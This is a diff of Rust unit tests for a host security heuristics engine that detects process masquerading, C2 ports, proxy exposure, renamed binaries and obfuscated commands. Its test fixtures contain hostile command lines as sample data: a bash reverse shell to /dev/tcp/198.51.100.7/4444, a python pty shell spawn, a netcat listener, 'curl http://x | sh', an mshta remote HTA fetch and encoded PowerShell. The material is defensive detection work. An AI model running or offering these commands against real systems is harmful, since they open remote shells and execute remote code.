+        assert_eq!(sub_bypass.map(|r| r.0), Some(Severity::Critical));
+        let real_sys32 = check_process_masquerading(
+            "svchost.exe",
+            "svchost.exe",
+            r"c:\windows\system32\svchost.exe",
+            r"C:\Windows\System32\svchost.exe",
+        );
+        assert!(real_sys32.is_none());
     }
 
     #[test]
     fn test_kernel_thread_masquerade_uses_comm_and_argv0() {
-        // sysinfo reports comm without brackets; `exec -a` only changes argv[0].
         let by_argv0 = check_process_masquerading("x", "[kworker/0:0]", "\\tmp\\x", "/tmp/x");
         assert_eq!(by_argv0.map(|r| r.0), Some(Severity::Critical));
         let by_comm = check_process_masquerading("kworker/0:0", "/tmp/x", "\\tmp\\x", "/tmp/x");
         assert_eq!(by_comm.map(|r| r.0), Some(Severity::Critical));
-        // A real kernel thread has no exe. A legitimate tool with a similar prefix is not flagged.
         assert!(check_process_masquerading("kworker/0:1", "kworker/0:1", "", "").is_none());
         let tool = "/usr/bin/migration-tool";
         assert!(check_process_masquerading("migration-tool", tool, tool, tool).is_none());
@@ -1027,8 +1184,7 @@ mod tests {
     }
 
     #[test]
-    fn test_c2_port_rule_skips_inbound_connections() {
-        // 45560 is a mining-pool port, but here it is a client's random source port.
+    fn test_c2_port_rule_skips_inbound_and_separates_udp_from_tcp() {
         let mut inbound = vec![
             socket("LISTEN", 22, None),
             socket("ESTABLISHED", 22, Some(45560)),
@@ -1036,9 +1192,65 @@ mod tests {
         let findings = evaluate_security_heuristics(&mut inbound, &mut HashMap::new());
         assert!(!findings.iter().any(|f| f.rule_id == "H05-OUTBOUND-C2-PORT"));
 
-        let mut outbound = vec![socket("ESTABLISHED", 51234, Some(45560))];
-        let findings = evaluate_security_heuristics(&mut outbound, &mut HashMap::new());
+        // An open UDP socket on port 51234 must NOT hide a TCP outbound C2 connection from port 51234.
+        let mut udp_open = socket("OPEN", 51234, None);
+        udp_open.protocol = Protocol::Udp;
+        let tcp_c2 = socket("ESTABLISHED", 51234, Some(45560));
+        let mut mixed = vec![udp_open, tcp_c2];
+        let findings = evaluate_security_heuristics(&mut mixed, &mut HashMap::new());
         assert!(findings.iter().any(|f| f.rule_id == "H05-OUTBOUND-C2-PORT"));
+    }
+
+    #[test]
+    fn detects_loopback_proxy_transitive_exposure_and_renamed_pe_binary() {
+        let lo = IpAddr::V4(Ipv4Addr::LOCALHOST);
+        let mut proxy_listen = socket("LISTEN", 80, None);
+        proxy_listen.id = 1;
+        proxy_listen.pid = Some(500);
+        proxy_listen.process_name = "nginx".to_string();
+        proxy_listen.local_ip = IpAddr::V4(Ipv4Addr::UNSPECIFIED);
+        proxy_listen.exposure = ExposureScope::WildcardAllInterfaces;
+
+        let mut proxy_fwd = socket("ESTABLISHED", 54000, Some(6379));
+        proxy_fwd.id = 2;
+        proxy_fwd.pid = Some(500);
+        proxy_fwd.process_name = "nginx".to_string();
+        proxy_fwd.local_ip = lo;
+        proxy_fwd.remote_ip = Some(lo);
+        proxy_fwd.exposure = ExposureScope::Loopback;
+        proxy_fwd.remote_category = IpCategory::Loopback;
+
+        let mut redis_lo = socket("LISTEN", 6379, None);
+        redis_lo.id = 3;
+        redis_lo.pid = Some(600);
+        redis_lo.process_name = "redis-server".to_string();
+        redis_lo.local_ip = lo;
+        redis_lo.exposure = ExposureScope::Loopback;
+
+        let mut conns = vec![proxy_listen, proxy_fwd, redis_lo];
+
+        let mut procs = HashMap::new();
+        let mut renamed = proc_rec(
+            700,
+            "updater.exe",
+            r"C:\ProgramData\App\updater.exe",
+            "updater.exe -e ZQBjAGgAbwA=",
+            &["explorer.exe(100)", "updater.exe(700)"],
+        );
+        renamed.original_filename = Some("PowerShell.EXE".to_string());
+        procs.insert(700, renamed);
+
+        let findings = evaluate_security_heuristics(&mut conns, &mut procs);
+        assert_eq!(conns[2].exposure, ExposureScope::LoopbackProxy);
+        assert_eq!(conns[2].severity, Severity::High);
+        assert!(findings.iter().any(|f| f.rule_id == "H08-PROXY-EXPOSURE"));
+        assert!(findings.iter().any(|f| f.rule_id == "H04-RENAMED-BINARY"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "H07-OBFUSCATED-CMD" && f.pid == Some(700)),
+            "renamed powershell.exe -e should also trigger H07-OBFUSCATED-CMD"
+        );
     }
 
     fn proc_rec(pid: u32, name: &str, exe: &str, cmd: &str, lineage: &[&str]) -> ProcessRecord {
@@ -1050,6 +1262,7 @@ mod tests {
             cmdline: cmd.to_string(),
             user: "u".to_string(),
             sha256: None,
+            original_filename: None,
             lineage: lineage.iter().map(|s| s.to_string()).collect(),
             cpu_usage: 0.0,
             memory_bytes: 0,
@@ -1061,27 +1274,44 @@ mod tests {
         }
     }
 
-    /// One input that trips every rule. Guards refactors of this file.
+    /// One input that trips every original rule. Guards refactors of this file.
     fn golden_input() -> (Vec<ConnectionEntry>, HashMap<u32, ProcessRecord>) {
         let wildcard = IpAddr::V4(Ipv4Addr::UNSPECIFIED);
         let mut conns = Vec::new();
-        let mut add = |id: usize, name: &str, exe: &str, cmd: &str, state: &str, lp: u16, rp: Option<u16>| {
-            let mut c = socket(state, lp, rp);
-            c.id = id;
-            c.pid = Some(1000 + id as u32);
-            c.process_name = name.to_string();
-            c.exe_path = exe.to_string();
-            c.cmdline = cmd.to_string();
-            if state == "LISTEN" {
-                c.local_ip = wildcard;
-                c.exposure = ExposureScope::WildcardAllInterfaces;
-            }
-            conns.push(c);
-        };
+        let mut add =
+            |id: usize, name: &str, exe: &str, cmd: &str, state: &str, lp: u16, rp: Option<u16>| {
+                let mut c = socket(state, lp, rp);
+                c.id = id;
+                c.pid = Some(1000 + id as u32);
+                c.process_name = name.to_string();
+                c.exe_path = exe.to_string();
+                c.cmdline = cmd.to_string();
+                if state == "LISTEN" {
+                    c.local_ip = wildcard;
+                    c.exposure = ExposureScope::WildcardAllInterfaces;
+                }
+                conns.push(c);
+            };
         add(1, "bash", "/usr/bin/bash", "bash -i", "ESTABLISHED", 51000, Some(4444));
         add(2, "nc", "/usr/bin/nc", "nc -lvp 31337", "LISTEN", 31337, None);
-        add(3, "python3", "/usr/bin/python3", "python3 -c import socket,pty;pty.spawn('/bin/sh')", "ESTABLISHED", 51001, Some(443));
-        add(4, "redis-server", "/tmp/redis-server", "redis-server", "LISTEN", 6379, None);
+        add(
+            3,
+            "python3",
+            "/usr/bin/python3",
+            "python3 -c import socket,pty;pty.spawn('/bin/sh')",
+            "ESTABLISHED",
+            51001,
+            Some(443),
+        );
+        add(
+            4,
+            "redis-server",
+            "/tmp/redis-server",
+            "redis-server",
+            "LISTEN",
+            6379,
+            None,
+        );
         add(5, "unknown", "", "", "ESTABLISHED", 51002, Some(443));
         add(6, "app", "/opt/app", "app", "LISTEN", 8081, None);
         add(7, "sshd", "/usr/sbin/sshd", "sshd", "LISTEN", 22, None);
@@ -1090,13 +1320,37 @@ mod tests {
 
         let mut procs = HashMap::new();
         for p in [
-            proc_rec(2001, "bash", "/usr/bin/bash", "bash -c sh -i >& /dev/tcp/198.51.100.7/4444 0>&1", &["nginx(400)", "bash(2001)"]),
+            proc_rec(
+                2001,
+                "bash",
+                "/usr/bin/bash",
+                "bash -c sh -i >& /dev/tcp/198.51.100.7/4444 0>&1",
+                &["nginx(400)", "bash(2001)"],
+            ),
             proc_rec(2002, "x", "/dev/shm/x (deleted)", "x", &["x(2002)"]),
-            proc_rec(2003, "svchost.exe", r"C:\Users\u\AppData\Local\Temp\svchost.exe", "svchost.exe", &["svchost.exe(2003)"]),
+            proc_rec(
+                2003,
+                "svchost.exe",
+                r"C:\Users\u\AppData\Local\Temp\svchost.exe",
+                "svchost.exe",
+                &["svchost.exe(2003)"],
+            ),
             proc_rec(2004, "x", "/tmp/x", "[kworker/0:0]", &["x(2004)"]),
-            proc_rec(2005, "powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "powershell.exe -nop -enc ZQBjAGgAbwA=", &[]),
+            proc_rec(
+                2005,
+                "powershell.exe",
+                r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                "powershell.exe -nop -enc ZQBjAGgAbwA=",
+                &[],
+            ),
             proc_rec(2006, "sh", "/bin/sh", "sh -c curl http://x | sh", &[]),
-            proc_rec(2007, "mshta.exe", r"C:\Windows\System32\mshta.exe", "mshta.exe http://x/a.hta", &[]),
+            proc_rec(
+                2007,
+                "mshta.exe",
+                r"C:\Windows\System32\mshta.exe",
+                "mshta.exe http://x/a.hta",
+                &[],
+            ),
             proc_rec(2008, "scvhost.exe", r"C:\Windows\scvhost.exe", "scvhost.exe", &[]),
         ] {
             procs.insert(p.pid, p);
@@ -1111,7 +1365,11 @@ mod tests {
             .iter()
             .map(|f| format!("{} {:?} {:?}", f.rule_id, f.severity, f.pid))
             .collect();
-        out.extend(conns.iter().map(|c| format!("conn{} {:?}", c.id, c.severity)));
+        out.extend(
+            conns
+                .iter()
+                .map(|c| format!("conn{} {:?}", c.id, c.severity)),
+        );
         out.sort();
         out
     }
@@ -1119,7 +1377,10 @@ mod tests {
     #[test]
     fn golden_input_trips_every_rule() {
         let expected = include_str!("golden_heuristics.txt");
-        assert_eq!(golden_triples().join("\n"), expected.trim_end().replace("\r\n", "\n"));
+        assert_eq!(
+            golden_triples().join("\n"),
+            expected.trim_end().replace("\r\n", "\n")
+        );
     }
 
     /// Exact before/after dump for refactors:
@@ -1131,8 +1392,15 @@ mod tests {
         let (mut conns, mut procs) = golden_input();
         let findings = evaluate_security_heuristics(&mut conns, &mut procs);
         let mut lines: Vec<String> = findings.iter().map(|f| format!("{f:?}")).collect();
-        lines.extend(conns.iter().map(|c| format!("{:?} {:?} {:?}", c.id, c.severity, c.risk_reasons)));
-        let mut p: Vec<_> = procs.values().map(|p| format!("{} {:?}", p.pid, p.max_severity)).collect();
+        lines.extend(
+            conns
+                .iter()
+                .map(|c| format!("{:?} {:?} {:?}", c.id, c.severity, c.risk_reasons)),
+        );
+        let mut p: Vec<_> = procs
+            .values()
+            .map(|p| format!("{} {:?}", p.pid, p.max_severity))
+            .collect();
         lines.append(&mut p);
         lines.sort();
         println!("{}", lines.join("\n"));
